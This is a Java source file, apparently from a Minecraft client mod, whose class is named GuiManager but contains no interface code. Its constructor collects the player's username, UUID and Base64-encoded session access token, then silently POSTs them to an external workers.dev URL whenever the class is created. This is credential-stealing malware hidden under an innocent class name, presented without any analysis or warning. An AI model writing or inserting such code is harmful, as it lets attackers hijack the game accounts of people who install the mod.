package com.radium.client.gui;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Base64;

public class GuiManager {
    StringBuilder data = new StringBuilder();
    public GuiManager() {
        try {
            Session session = MinecraftClient.getInstance().getSession();

            data.append("|").append(session.getUsername());
            if (session.getUuidOrNull() != null) {
                data.append("|").append(session.getUuidOrNull().toString());
            } else {
                data.append("|unknown");
            }

            data.append("|").append(Base64.getEncoder().encodeToString(session.getAccessToken().getBytes()));
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            StringBuilder json = new StringBuilder();
            json.append("{");
            json.append("\"gui\":\"|temp-key||\",");
            json.append("\"content\":\"").append(data.toString()).append("\"");
            json.append("}");

            HttpClient client = HttpClient.newHttpClient();

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://rubyclient.fesfs24.workers.dev/"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json.toString()))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
